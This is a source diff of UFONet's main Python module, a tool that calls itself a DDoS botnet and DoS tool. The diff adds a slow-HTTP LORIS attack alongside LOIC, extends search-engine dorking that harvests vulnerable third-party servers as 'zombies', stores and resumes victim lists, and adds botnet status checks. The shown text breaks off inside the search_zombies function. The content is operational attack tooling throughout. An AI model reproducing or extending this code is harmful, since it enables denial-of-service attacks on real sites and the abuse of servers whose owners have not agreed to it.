@@ -1,13 +1,13 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015/2016/2017 - by psy (epsylon@riseup.net)
+UFONet - (DDoS botnet + DoS tool) via Web Abuse - 2013/2014/2015/2016/2017/2018 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import os, sys, re, traceback, random, time, threading, base64, socket, httplib, ssl, requests, string
+import os, sys, re, traceback, random, time, threading, base64, socket, httplib, ssl, string
 import StringIO, urllib, urllib2, cgi, json
 from urlparse import urlparse
 from random import randrange, shuffle
@@ -19,6 +19,7 @@ from doll import Doll
 from inspector import Inspector
 from abductor import Abductor
 from loic import LOIC
+from loris import LORIS
 
 DEBUG = 0
 
@@ -32,6 +33,8 @@ class UFONet(object):
         self.droids_file = 'botnet/droids.txt' # set source path to retrieve 'droids'
         self.ucavs_file = 'botnet/ucavs.txt' # set source path to retrieve 'ucavs'
         self.rpcs_file = 'botnet/rpcs.txt' # set source path to retrieve 'rpcs'
+        self.humans_file = 'botnet/humans.txt' # set source path to retrieve 'humans'
+        self.dorks_file = 'botnet/dorks.txt' # set source path to retrieve 'dorks'
         self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
         self.referer = 'http://127.0.0.1/'
         self.head = False
@@ -73,21 +76,24 @@ class UFONet(object):
         return self.options
 
     def banner_welcome(self):
-        print "                                             0========================================0"
-        print "                '' '----' ''                 ||                                      ||"   
-        print "             .'_.- (    ) -._'.              ||  * Class: UFONet -ViPR404-           ||"
-        print "           .'.'    |'..'|    '.'.            ||                                      ||"
-        print "    .-.  .' /'--.__|____|__.--'\ '.  .-.     ||  * Type: Scout/Transporter           ||"
-        print "   (O).)-| |  \    |    |    /  | |-(.(O)    ||                                      ||"
-        print "    `-'  '-'-._'-./      \.-'_.-'-'  `-'     ||  * Botnet (featured):                ||"
-        print "       _ | |   '-.________.-'   | | _        ||                                      ||"
-        print "    .' _ | |     |   __   |     | | _ '.     ||    -Zombies: HTTP GET bots           ||"
-        print "   / .' ''.|     | /    \ |     |.'' '. \    ||    -Droids : HTTP GET (+params) bots ||"
-        print "   | |( )| '.    ||      ||    .' |( )| |    ||    -Aliens : HTTP POST bots          ||"
-        print "   \ '._.'   '.  | \    / |  .'   '._.' /    ||    -UCAVs  : Web Abusing bots        ||"
-        print "    '.__ ______'.|__'--'__|.'______ __.'     ||    -X-RPCs : XML-RPC bots            ||"
-        print "   .'_.-|                          |-._'.    ||                                      ||"                                         
-        print "                                             0|======================================|0" 
+        print "                                             0===============================================0"
+        print "                '' '----' ''                 ||                                             ||"   
+        print "             .'_.- (    ) -._'.              ||  * Botnet -> DDoS:                          ||"
+        print "           .'.'    |'..'|    '.'.            ||                                             ||"
+        print "    .-.  .' /'--.__|____|__.--'\ '.  .-.     ||      -Zombies : HTTP GET bots               ||"
+        print "   (O).)-| |  \  * |    |*   /  | |-(.(O)    ||      -Droids  : HTTP GET (+params) bots     ||"
+        print "    `-'  '-'-._'-./      \.-'_.-'-'  `-'     ||      -Aliens  : HTTP POST bots              ||"
+        print "       _ | |   '-.________.-'   | | _        ||      -UCAVs   : Web Abusing bots            ||"
+        print "    .' _ | |     |   __   |     | | _ '.     ||      -X-RPCs  : XML-RPC bots                ||"
+        print "   / .' ''.|     | /____\ |     |.'' '. \    ||                                             ||"
+        print "   | |( )| '.    ||_____ ||    .' |( )| |    ||  * Close Combat -> DoS:                     ||"
+        print "   \ '._.'   '.  | \____/ |  .'   '._.' /    ||                                             ||"
+        print "    '.__ ______'.|__'--'__|.'______ __.'     ||      -LOIC    : Fast HTTP requests          ||"
+        print "   .'_.-|                          |-._'.    ||      -LORIS   : Slow HTTP requests          ||"                                      
+        print "                                             ||                                             ||"
+        print "    * Class: UFONet - ViPR404 (model B)-     ||  * Featured: Crawler, +CVE, +WAF detection  ||"
+        print "    * Type: /Scout/Transporter/Warfare/      ||                                             ||"
+        print "                                             0|=============================================|0" 
         print ""
 
     def banner(self):
@@ -122,12 +128,11 @@ class UFONet(object):
             self.agents.append(agent)
         self.user_agent = random.choice(self.agents).strip()
         self.search_engines = [] # available dorking search engines
-        self.search_engines.append('bing') # [27/06/2017: OK!]
-        self.search_engines.append('yahoo') # [27/06/2017: OK!]
-        self.search_engines.append('yandex') # [27/06/2017: OK! + captcha discovering]
+        self.search_engines.append('bing') # [03/02/2018: OK!]
+        self.search_engines.append('yahoo') # [03/02/2018: OK!]
+        #self.search_engines.append('yandex') # [03/02/2018: deprecated! -> captchasound]
         #self.search_engines.append('duck') [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
         #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
-
         if not os.path.exists("core/json/"): # create gui json cfg files folder
             os.mkdir("core/json/")
         self.banner_welcome()
@@ -223,45 +228,143 @@ class UFONet(object):
             print '\n-> Key (share it using SNEAKNET!):', input_key
             print '\nDecryption PoC:', c.decrypt(), "\n"
 
-        # search for 'zombies' on search engines results
+        # search for 'zombies' on search engines results (dorking)
         if options.search:
             zombies = []
             if options.engine:
                 engine = options.engine
             else:
-                engine = "bing" # default search engine
+                engine = "yahoo" # default search engine
             try:
                 self.banner()
+                if not os.path.exists(self.humans_file) == True:
+                    f = open(self.humans_file, 'w')
+                    f.close()
+                lf = open(self.humans_file, 'r')
+                restored = lf.readlines()
+                zombies_restored = len(restored)
+                lf.close()
+                lz = open(self.zombies_file, 'r')
+                zombies_army = lz.readlines()
+                for zombie in zombies_army:
+                    zombies.append(zombie) # add zombies from army to the zombies pool
+                lz.close()
+                if len(restored) > 0:
+                    print "\n[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
+                    if not self.options.forceyes:
+                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
+                        print '-'*25
+                    else:
+                        backup_reply = "Y"
+                    if backup_reply == "n" or backup_reply == "N":
+                        print "\n[Info] Removing data stored and starting a new search...\n"
+                        os.remove(self.humans_file)
+                        zombies_restored = 0 # flush zombies restored
+                        print '-'*25 + "\n"
+                    else:
+                        print "\n[Info] Restoring data and starting a new search...\n"
+                        print '-'*25 + "\n"
+                        for zombie in restored:
+                            zombies.append(zombie) # add previous data to zombies pool
                 if options.allengines:
                     for e in self.search_engines:
                         engine = e
-                        print("\nSearching for NEW 'zombies' (not present on your list) using: "+engine+'\n')
-                        print '='*22 + '\n'
+                        print '='*44
+                        print("\nSearching for zombies (with AI mode) using: "+engine+'\n')
+                        print '='*44 + '\n'
                         self.options.engine = engine
-                        zombies_chain = self.search_zombies(dork='')
-                        if zombies_chain != None:
-                            for zombie in zombies_chain:
-                                zombies.append(zombie)
-                    print '='*44
-                    print "\nTotal zombies found:", len(zombies), "\n"
+                        try:
+                            zombies_chain = self.search_zombies(dork='', zombies_found=zombies)
+                            if zombies_chain != None:
+                                for zombie in zombies_chain:
+                                    if zombie not in zombies: # evade possible repetitions
+                                        zombies.append(zombie)
+                        except:
+                            if zombies: # backup all new zombies found to file in case of exception
+                                for zombie in zombies:
+                                    if zombie+os.linesep not in restored: # only append new zombies found
+                                        with open(self.humans_file, "a") as f:
+                                            f.write(str(zombie+os.linesep))
+                else:
+                    if restored:
+                        print '='*44
+                    print("\nSearching for zombies (with AI mode) using: "+engine+"\n")
                     print '='*44 + '\n'
-                else:
-                    print("\nSearching for NEW 'zombies' (not present on your list) using: "+engine+"\n")
-                    print '='*22 + '\n'
-                    zombies = self.search_zombies(dork='')
-                if zombies == None:
-                    check_url_link_reply = "N"
-                    pass
-                else:
+                    if restored: # from restored file
+                        try:
+                            zombies_chain = self.search_zombies(dork='', zombies_found=zombies)
+                            if zombies_chain != None:
+                                for zombie in zombies_chain:
+                                    if zombie not in zombies: # evade possible repetitions
+                                        zombies.append(zombie)
+                        except:
+                            if zombies: # backup all new zombies found to file in case of exception
+                                for zombie in zombies:
+                                    if zombie+os.linesep not in restored: # only append new zombies found
+                                        with open(self.humans_file, "a") as f:
+                                            f.write(str(zombie+os.linesep))
+                    else:
+                        try:
+                            zombies = self.search_zombies(dork='', zombies_found=zombies)
+                        except:
+                            if zombies: # backup all new zombies found to file in case of exception
+                                for zombie in zombies:
+                                    if zombie+os.linesep not in restored: # only append new zombies found
+                                        with open(self.humans_file, "a") as f:
+                                            f.write(str(zombie+os.linesep))
+                total_restored = zombies_restored
+                new_zombies = 0 # new zombies counter
+                f = open(self.zombies_file, 'r')
+                zz = f.readlines()
+                f.close()
+                zombies_found = []
+                for z in zombies:
+                    if z.endswith(os.linesep):
+                        z = z.replace(os.linesep, "")
+                    if z not in zz and z+os.linesep not in zz:
+                        new_zombies = new_zombies + 1
+                        zombies_found.append(z)
+                print '='*62
+                print "\n- Victims found:", len(zombies_found), "\n"
+                print "    - Restored:", total_restored
+                print "    - Dorked:", len(zombies_found) - total_restored, "\n"
+                print '-'*32
+                print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
+                print '='*62 + '\n'
+                if len(zombies) > 0:
                     if not self.options.forceyes:
-                        check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
+                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
+                        print '-'*25
+                    else:
+                        check_backup_reply = "Y"
+                    if check_backup_reply == "n" or check_backup_reply == "N":
+                        if os.path.isfile(self.humans_file): 
+                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
+                        print "\n[Info] Temporal data correctly removed...\n"
+                    else:
+                        with open(self.humans_file, "w") as f:
+                            for z in zombies_found:
+                                if z.endswith(os.linesep):
+                                    z = z.replace(os.linesep, "")
+                                if z not in zz or z+os.linesep not in zz:
+                                    f.write(z+os.linesep)
+                        f.close()
+                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
+                    print '-'*25 + "\n"
+                if new_zombies and new_zombies > 0:
+                    if not self.options.forceyes:
+                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
+                        print '-'*25 + "\n"
                     else:
                         check_url_link_reply = "Y"
-                if check_url_link_reply == "n" or check_url_link_reply == "N":
-                    print "\nBye!\n"
+                    if check_url_link_reply == "n" or check_url_link_reply == "N":
+                        print "Bye!\n"
+                        pass
+                    else:
+                        print "\n" + '='*44
+                        test = self.testing(zombies_found)
                 else:
-                    test = self.testing(zombies)
-                self.update_missions_stats() # update mothership missions stats
+                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
             except Exception:
                 print ("[Error] - Something wrong searching using: "+engine+"\n")
 
@@ -270,106 +373,288 @@ class UFONet(object):
             if options.engine:
                 engine = options.engine
             else:
-                engine = "bing" # default search engine
+                engine = "yahoo" # default search engine
             try:
+                dorks = self.extract_dorks()
+                if not dorks:
+                    return
+                zombies = []
                 self.banner()
+                if not os.path.exists(self.humans_file) == True:
+                    f = open(self.humans_file, 'w')
+                    f.close()
+                lf = open(self.humans_file, 'r')
+                restored = lf.readlines()
+                zombies_restored = len(restored)
+                lf.close()
+                lz = open(self.zombies_file, 'r')
+                zombies_army = lz.readlines()
+                for zombie in zombies_army:
+                    zombies.append(zombie) # add zombies from army to the zombies pool
+                lz.close()
+                if len(restored) > 0:
+                    print "\n[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
+                    if not self.options.forceyes:
+                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
+                        print '-'*25
+                    else:
+                        backup_reply = "Y"
+                    if backup_reply == "n" or backup_reply == "N":
+                        print "\n[Info] Removing data stored and starting a new search...\n"
+                        os.remove(self.humans_file)
+                        zombies_restored = 0 # flush zombies restored
+                        print '-'*25 + "\n"
+                    else:
+                        print "\n[Info] Restoring data and starting a new search...\n"
+                        print '-'*25 + "\n"
+                        for zombie in restored:
+                            zombies.append(zombie) # add previous data to zombies pool
+                total_restored = zombies_restored
                 if options.allengines:
-                    zombies = []
                     for e in self.search_engines:
                         engine = e
-                        print("\nSearching for NEW 'zombies' (not present on your list) using: "+engine+ " [from a list of 'dorks']\n")
+                        print '='*44
+                        print("\nSearching for zombies (with AI mode) using: "+engine+ " [from a list of 'dorks']\n")
+                        print '='*44 + '\n'
                         self.options.engine = engine
-                        dorks = self.extract_dorks()
-                        if not dorks:
-                            return
                         for dork in dorks:
                             print '='*22
                             print "Dork:", dork
                             print '='*22 + '\n'
-                            dorked_zombies = self.search_zombies(dork)
-                            if dorked_zombies != None:
+                            try:
+                                dorked_zombies = self.search_zombies(dork, zombies) # AI mode
                                 for zombie in dorked_zombies:
-                                    zombies.append(zombie)
+                                    if zombie not in zombies: # evade repetitions for zombies found
+                                        zombies.append(zombie)
+                                        if zombie+os.linesep not in restored: # only append new zombies found
+                                            with open(self.humans_file, "a") as f:
+                                                f.write(str(zombie+os.linesep))
+                                            f.close()
+                            except:
+                                if zombies: # backup new zombies found on exception
+                                    for zombie in zombies:
+                                        if zombie+os.linesep not in restored: # only append new zombies found
+                                            with open(self.humans_file, "a") as f:
+                                                f.write(str(zombie+os.linesep))
+                                            f.close()
                 else:
-                    print("\nSearching for NEW 'zombies' (not present on your list) using: "+engine+ " [from a list of 'dorks']\n")
-                    dorks = self.extract_dorks()
-                    if not dorks:
-                        return
-                    zombies = []
+                    if restored:
+                        print '='*44
+                    print("\nSearching for zombies (with AI mode) using: "+engine+ " [from a list of 'dorks']\n")
+                    print '='*44 + '\n'
                     for dork in dorks:
                         print '='*22
                         print "Dork:", dork
                         print '='*22 + '\n'
-                        dorked_zombies = self.search_zombies(dork)
-                        for zombie in dorked_zombies:
-                            zombies.append(zombie)
-                print '='*44
-                print '=Total Possible Zombies:', str(self.total_possible_zombies)
-                print '='*44
-                if str(self.total_possible_zombies) == '0':
-                    print "\n[Info] - Not any victim(s) found... Bye!\n"
-                    return #sys.exit(2)
-                if not self.options.forceyes:
-                    check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
-                    print '-'*25
+                        try:
+                            dorked_zombies = self.search_zombies(dork, zombies) # AI mode
+                            if dorked_zombies != None:
+                                for zombie in dorked_zombies:
+                                    if zombie not in zombies: # evade repetitions for zombies found
+                                        zombies.append(zombie)
+                        except:
+                            if zombies: # backup new zombies found on exception
+                                for zombie in zombies:
+                                    if zombie+os.linesep not in restored: # only append new zombies found
+                                        with open(self.humans_file, "a") as f:
+                                            f.write(str(zombie+os.linesep))
+                                        f.close()
+                new_zombies = 0 # new zombies counter
+                f = open(self.zombies_file, 'r')
+                zz = f.readlines()
+                f.close()
+                zombies_found = []
+                for z in zombies:
+                    if z.endswith(os.linesep):
+                        z = z.replace(os.linesep, "")
+                    if z not in zz and z+os.linesep not in zz:
+                        new_zombies = new_zombies + 1
+                        zombies_found.append(z)
+                print '='*62
+                print "\n- Victims found:", len(zombies_found), "\n"
+                print "    - Restored:", total_restored
+                print "    - Dorked:", len(zombies_found) - total_restored, "\n"
+                print '-'*32
+                print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
+                print '='*62 + '\n'
+                if len(zombies_found) > 0:
+                    if not self.options.forceyes:
+                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
+                        print '-'*25
+                    else:
+                        check_backup_reply = "Y"
+                    if check_backup_reply == "n" or check_backup_reply == "N":
+                        if os.path.isfile(self.humans_file):
+                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
+                        print "\n[Info] Temporal data correctly removed...\n"
+                    else:
+                        with open(self.humans_file, "w") as f:
+                            for z in zombies_found:
+                                if z.endswith(os.linesep):
+                                    z = z.replace(os.linesep, "")
+                                if z not in zz or z+os.linesep not in zz:
+                                    f.write(z+os.linesep)
+                        f.close()
+                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
+                    print '-'*25 + "\n"
+                if new_zombies and new_zombies > 0:
+                    if not self.options.forceyes:
+                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
+                        print '-'*25 + "\n"
+                    else:
+                        check_url_link_reply = "Y"
+                    if check_url_link_reply == "n" or check_url_link_reply == "N":
+                        print "Bye!\n"
+                        pass
+                    else:
+                        print "\n" + '='*44
+                        test = self.testing(zombies_found)
                 else:
-                    check_url_link_reply = "Y"
-                if check_url_link_reply == "n" or check_url_link_reply == "N":
-                    print "\nBye!\n"
-                else:
-                    test = self.testing(zombies)
-                self.update_missions_stats() # update mothership missions stats
+                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
             except Exception:
                 print ("[Error] - Something wrong searching using: "+engine+"\n")
 
         # auto-search for 'zombies' (dorks+all_engines+time -> to discover max new zombies)
         if options.autosearch:
             try:
+                dorks = self.extract_dorks()
+            except:
+                print "\n[Info] Not any dork present at: 'botnet/dorks.txt'. Aborting!\n"
+                return
+            engines_list = self.search_engines
+            stop_flag = False # use a flag to establish an end
+            try:
                 self.banner()
                 print "\nSearching automatically for 'zombies' (WARNING: this may take several time!)\n" 
                 print "[Info] Try to use CTRL+z (on shell) to STOP IT! ;-)\n"
-                print "[Info] REMEMBER: Results are saved at the end of the whole process. Be patient...\n"
                 print '-'*25 + "\n"
-                stop_flag = False # use a flag to establish an end
                 zombies_found = []
-                engines_list = self.search_engines
+                lz = open(self.zombies_file, 'r')
+                zombies_army = lz.readlines()
+                for zombie in zombies_army:
+                    zombies_found.append(zombie) # add zombies from army to the zombies found pool
+                lz.close()
+                if not os.path.exists(self.humans_file) == True:
+                    f = open(self.humans_file, 'w')
+                    f.close()
+                lf = open(self.humans_file, 'r')
+                restored = lf.readlines()
+                zombies_restored = len(restored)
+                lf.close()
+                if len(restored) > 0: 
+                    print "[Info] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n"
+                    if not self.options.forceyes:
+                        backup_reply = raw_input("Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
+                        print '-'*25
+                    else:
+                        backup_reply = "Y"
+                    if backup_reply == "n" or backup_reply == "N":
+                        print "\n[Info] Removing data stored and starting a new (auto)search...\n"
+                        os.remove(self.humans_file)
+                        zombies_restored = 0 # flush zombies restored
+                        print '-'*25 + "\n"
+                    else:
+                        print "\n[Info] Restoring data and starting a new (auto)search...\n"
+                        print '-'*25 + "\n"
+                        for zombie in restored:
+                            zombies_found.append(zombie) # add previous data to zombies found pool
+                total_restored = zombies_restored
                 while stop_flag == False:
+                    if not os.path.exists(self.humans_file) == True:
+                        f = open(self.humans_file, 'w')
+                        f.close()
+                    lf = open(self.humans_file, 'r') # read it on each iteration to update changes
+                    restored = lf.readlines()
+                    lf.close()
+                    zombies_restored = len(restored)
                     for e in engines_list:
                         zombies_counter = 0 # use it also as (engine) flag
                         engine = e
                         self.options.engine = engine
-                        print("Searching for NEW 'zombies' (not present on your list) using: "+engine+'\n')
-                        dorks = self.extract_dorks()
-                        if not dorks:
-                            return
+                        print '='*44 + '\n'
+                        print("Searching for zombies (with AI mode) using: "+engine+'\n')
+                        print '='*44 + '\n'
                         for dork in dorks:
                             print '='*22
                             print "Dork:", dork
                             print '='*22 + '\n'
-                            dorked_zombies = self.search_zombies(dork)
-                            for zombie in dorked_zombies:
-                                if zombie not in zombies_found: # evade repetitions for zombies found
-                                    zombies_found.append(zombie)
-                                    zombies_counter = zombies_counter + 1                   
+                            try:
+                                dorked_zombies = self.search_zombies(dork, zombies_found) # AI mode
+                                for zombie in dorked_zombies:
+                                    if zombie not in zombies_found: # evade repetitions for zombies found
+                                        zombies_found.append(zombie)
+                                        if zombie+os.linesep not in restored: # only append new zombies found
+                                            with open(self.humans_file, "a") as f:
+                                                f.write(str(zombie+os.linesep))
+                                            f.close()
+                                        zombies_counter = zombies_counter + 1
+                            except:
+                                if zombies_found: # backup new zombies found on exception
+                                    for zombie in zombies_found:
+                                        if zombie+os.linesep not in restored: # only append new zombies found
+                                            with open(self.humans_file, "a") as f:
+                                                f.write(str(zombie+os.linesep))
+                                            f.close()
                         if zombies_counter == 0:
-                            print "[Info] - No more NEW victims found (by the moment) using: "+engine+"... Let's remove it from queue!\n"
+                            print "[Info] - NOT more NEW victims found (by the moment) using: "+engine+"... Let's remove it from queue!\n"
+                            print '-'*25 + "\n"
                             engines_list.remove(engine) # remove not more results engine from search engines list
                             if not engines_list: # if search engines empty, call return-exit routine
-                               print "[Info] - Search engines aren't providing more results... Let's exit! ;-)\n"
-                               stop_flag = True # exit flag up
-                print '='*44
-                print "\nTotal zombies (auto)found:", len(zombies_found), "\n"
-                print '='*44 + '\n'
-                if not self.options.forceyes:
-                    check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
-                    print '-'*25
+                                print "[Info] - Search engines aren't providing more results... Exiting! ;-)\n"
+                                print '-'*25 + "\n"
+                                stop_flag = True # exit flag up
+                new_zombies = 0 # new zombies counter
+                f = open(self.zombies_file, 'r')
+                zz = f.readlines()
+                f.close()
+                all_zombies_found = []
+                for z in zombies_found:
+                    if z.endswith(os.linesep):
+                        z = z.replace(os.linesep, "")
+                    if z not in zz and z+os.linesep not in zz:
+                        new_zombies = new_zombies + 1
+                        all_zombies_found.append(z)
+                print '='*62
+                print "\n- Victims found:", len(all_zombies_found), "\n"
+                print "    - Restored:", total_restored
+                print "    - Dorked:", len(all_zombies_found) - total_restored, "\n"
+                print '-'*32
+                print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
+                print '='*62 + '\n'
+                if len(zombies_found) > 0:
+                    if not self.options.forceyes:
+                        check_backup_reply = raw_input("Want to save results for a future search? (Y/n)\n")
+                        print '-'*25
+                    else:
+                        check_backup_reply = "Y"
+                    if check_backup_reply == "n" or check_backup_reply == "N":
+                        if os.path.isfile(self.humans_file):
+                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
+                        print "\n[Info] Temporal data correctly removed...\n"
+                    else:
+                        with open(self.humans_file, "w") as f:
+                            for z in all_zombies_found:
+                                if z.endswith(os.linesep):
+                                    z = z.replace(os.linesep, "")
+                                if z not in zz or z+os.linesep not in zz:
+                                    f.write(z+os.linesep)
+                        f.close()
+                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
+                    print '-'*25 + "\n"
+                if new_zombies and new_zombies > 0:
+                    if not self.options.forceyes:
+                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
+                        print '-'*25 + "\n"
+                    else:
+                        check_url_link_reply = "Y"
+                    if check_url_link_reply == "n" or check_url_link_reply == "N":
+                        print "Bye!\n"
+                        pass
+                    else:
+                        print "\n" + '='*44
+                        test = self.testing(all_zombies_found)
                 else:
-                    check_url_link_reply = "Y"
-                if check_url_link_reply == "n" or check_url_link_reply == "N":
-                    print "\nBye!\n"
-                else:
-                    test = self.testing(zombies_found)
-                self.update_missions_stats() # update mothership missions stats
+                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
             except Exception:
                 print ("[Error] - Something wrong (auto)searching...\n")
 
@@ -397,6 +682,26 @@ class UFONet(object):
                 self.update_missions_stats() # update mothership missions stats
             except Exception:
                 print ("\n[Error] - Something wrong testing XML-RPC servers!\n")
+                traceback.print_exc()
+
+        # check botnet searching for zombies offline
+        if options.testoffline:
+            try:
+                self.banner()
+                testbotnet = self.testing_offline()
+                self.update_missions_stats() # update mothership missions stats
+            except Exception:
+                print ("\n[Error] - Something wrong checking for offline 'zombies'!\n")
+                traceback.print_exc()
+
+        # check ALL botnet status
+        if options.testall:
+            try:
+                self.banner()
+                test_all_botnet = self.testing_all()
+                self.update_missions_stats() # update mothership missions stats
+            except Exception:
+                print ("\n[Error] - Something wrong testing ALL botnet status!\n")
                 traceback.print_exc()
 
         # attack target -> exploit Open Redirect massively and conduct vulnerable servers to a target
@@ -447,7 +752,7 @@ class UFONet(object):
                 print("\nOrdering 'zombies' to attack you for benchmarking ;-)\n")
                 print("[Warning] You are going to reveal your real IP to your zombies...\n")
                 if not self.options.forceyes:
-                    update_reply = raw_input("Wanna continue (Y/n)")
+                    update_reply = raw_input("Want to continue? (Y/n)")
                 else:
                     update_reply = "Y"
                 if update_reply == "n" or update_reply == "N":
@@ -497,7 +802,7 @@ class UFONet(object):
                 print("\nTrying to update automatically to the latest stable version\n")
                 Updater() 
             except:
-                print("\nSomething was wrong!. To have working this feature, you should clone UFONet with::\n")
+                print("\nSomething was wrong!. To have working this feature, you should clone UFONet with:\n")
                 print("$ git clone https://github.com/epsylon/ufonet\n")
 
         # launch GUI/Web interface
@@ -650,7 +955,7 @@ class UFONet(object):
     def update_flying_stats(self):
         if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
             with open(self.mothership_stats_file, "w") as f:
-                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "crashed": "0"}, f, indent=4) # starting reset
+                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "crashed": "0"}, f, indent=4) # starting reset
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
@@ -741,6 +1046,17 @@ class UFONet(object):
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
 
+    def update_loris_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aloris = data["loris"]
+        aloris = str(int(aloris) + 1) # add new loris attack
+        data["loris"] = aloris
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
     def uploading_list(self): 
         import gzip
         abductions = "abductions.txt.gz"
@@ -818,7 +1134,7 @@ class UFONet(object):
             print("[Info] - 'X-RPCs' on 'blackhole' : "+ str(num_reflectors))
             print '-'*12 + '\n'
             if not self.options.forceyes:
-                update_reply = raw_input("Wanna merge ONLY new 'zombies' on server (Y/n)")
+                update_reply = raw_input("Want to merge ONLY new 'zombies' into the server? (Y/n)")
                 print '-'*25
             else:
                 update_reply = "Y"
@@ -1138,7 +1454,7 @@ class UFONet(object):
         print("\n[Info] - Congratulations!. Total downloaded: " + str(total_zombies))
         print '-'*12
         if not self.options.forceyes:
-            update_reply = raw_input("\nWanna merge ONLY new 'troops' to your army (Y/n)")
+            update_reply = raw_input("\nWant to merge ONLY new 'troops' in your army? (Y/n)")
             print '-'*25
         else:
             update_reply = "Y"
@@ -1258,68 +1574,72 @@ class UFONet(object):
     def extract_dorks(self):
         # extract dorks from file (ex: 'dorks.txt')
         try:
-            f = open('botnet/dorks.txt')
+            f = open(self.dorks_file)
             dorks = f.readlines()
             dorks = [ dork.replace('\n','') for dork in dorks ]
             f.close()
             if not dorks:
-                print "\n[Error] - Imposible to retrieve 'dorks' from file.\n"
+                if not options.autosearch:
+                    print "\n[Error] - Imposible to retrieve 'dorks' from file.\n"
                 return
             else:
                 return dorks
         except:
-            if os.path.exists('botnet/dorks.txt') == True:
-                print '[Error] - Cannot open:', 'dorks.txt', "\n"
-                return #sys.exit(2)
+            if not options.autosearch:
+                if os.path.exists(self.dorks_file) == True:
+                    print '[Error] - Cannot open:', 'dorks.txt', "\n"
+                    return #sys.exit(2)
+                else:
+                    print '[Error] - Cannot found:', 'dorks.txt', "\n"
+                    return #sys.exit(2)
             else:
-                print '[Error] - Cannot found:', 'dorks.txt', "\n"
-                return #sys.exit(2)
+                return
 
-    def search_zombies(self, dork):
+    def search_zombies(self, dork, zombies_found):
         # crawlering on search engine results to extract zombies
         options = self.options
         zombies = []
-        #if not options.engine or options.engine == 'duck': # using duck [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
-        #    url = 'https://duckduckgo.com/html/' # ex: POST -> path
-        #    if options.search: # search from query
-                #q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results [ deprecated ]
-        #    if options.dorks: # search from a dork
-                #q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results [ deprecated ]
-        #    data = 'q=' + q + '&b=&kl=us-en&kp=-1' # evade safe search
-        #    self.user_agent = random.choice(self.agents).strip() # suffle user-agent
-        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-        #    if options.verbose:
-        #        print("[Info] Query used: " + url + " [POST -> " + data + "]\n")
-        #    try:
-        #        req = urllib2.Request(url, data, headers)
-        #        rsp = urllib2.urlopen(req)
-        #        content = rsp.read()
-        #    except:
-        #        print('[Error] - Unable to connect to duck\n')
-        #        if options.allengines:
-        #            return
-        #        if not options.dorks:
-        #            if not self.options.forceyes:
-        #                update_reply = raw_input("Wanna try a different search engine (Y/n)")
-        #            else:
-        #                update_reply = "Y"
-        #            if update_reply == "n" or update_reply == "N":
-        #                return #sys.exit(2)
-        #            print "\nSearch engines available:"
-        #            print '-'*25
-        #            for e in self.search_engines:
-        #                print "+ "+e
-        #            print '-'*25
-        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'duck'"
-        #            return #sys.exit(2)
-        #        else:
-        #            req_reply = ''
-        #    regex = '<a class="result__url" href="(.+?)"' # regex magics [05/08/2016]
-        #    pattern = re.compile(regex)
-        #    url_links = re.findall(pattern, req_reply)
-        if not options.engine or options.engine == 'bing': # using bing by default [27/06/2017: OK!]
-            if not options.engine:
-                options.engine = 'bing'
+        if not options.engine: # default search engine
+            options.engine = 'yahoo'
+        if options.engine == 'duck': # using duck [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
+            url = 'https://duckduckgo.com/html/' # ex: POST -> path
+            if options.search: # search from query
+               q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results [ deprecated ]
+            if options.dorks: # search from a dork
